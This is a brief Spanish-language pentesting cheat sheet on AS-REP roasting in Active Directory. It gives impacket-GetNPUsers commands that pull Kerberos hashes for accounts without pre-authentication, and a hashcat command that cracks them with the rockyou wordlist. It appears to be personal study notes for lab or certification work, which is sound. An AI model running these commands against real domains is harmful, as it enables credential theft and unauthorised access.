# ASREProstable 

Tags: #AD #ASREProstable #Impacket #Kali #Parrot #HashCat 

## Explotar con Impacket

```bash 
❯ impacket-GetNPUsers domain1.corp/ -usersfile users.txt -no-pass -dc-ip <IP>       # Ataque usando un lista de usuarios 

❯ impacket-GetNPUsers 'domain1.corp/user' -no-pass -dc-ip <IP> -request

	# domain1.corp/user = Usuario vulnerable o lista de usuarios 
	# no-pass = No hay una contraseña 
	# dc-ip = Ip del DC

Notas:
	1. Tener la IP con el dominio en '/etc/hosts'
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force

	# m = Método por fuerza bruta
	# 18200 = Es un ASREProstable
	# hashes.asreproast = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```